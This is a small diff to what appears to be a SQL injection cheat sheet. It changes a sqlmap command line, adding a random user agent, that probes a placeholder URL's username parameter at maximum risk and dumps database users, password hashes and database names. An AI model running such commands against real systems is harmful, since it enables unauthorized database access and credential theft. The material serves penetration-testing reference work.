@@ -27,7 +27,7 @@ transformed into U+0027 APOSTROPHE (')
 ## SQL injection using SQLmap
 Basic arguments for SQLmap
 ```
-sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
+sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
 
 Custom injection in UserAgent/Header/Referer/Cookie
